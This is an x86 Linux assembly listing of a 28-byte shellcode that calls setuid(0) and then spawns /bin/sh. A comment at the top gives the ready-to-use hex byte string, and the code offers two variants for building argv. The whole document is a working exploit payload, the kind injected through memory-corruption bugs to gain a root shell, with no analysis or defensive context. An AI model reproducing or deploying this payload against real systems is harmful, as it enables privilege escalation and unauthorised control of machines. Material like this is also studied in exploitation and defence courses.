# setuid(0); execve("/bin/sh", 0, 0) - 28 bytes.
# char shellcode[] = "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80";

.text
.globl _start
_start:
	pushl	$23		# sys_setuid16
	popl	%eax		#
	xorl	%ebx, %ebx	# 0 (root uid)
	int	$0x80		# syscall

	pushl	$11		# sys_execve
	popl	%eax
	cdq			# 0 (NULL env)
	pushl	%edx		# ""
	pushl	$0x68732f2f	# '//sh'
	pushl	$0x6e69622f	# '/bin'
	movl	%esp, %ebx	# addr of "/bin//sh"

# Option 1: argv = NULL (2 bytes long) #
	movl	%edx, %ecx
# Option 2: argv = ["/bin/sh", NULL] (4 bytes long) #
#	pushl	%edx
#	pushl	%ebx
#	movl	%esp, %ecx


	int	$0x80		# syscall
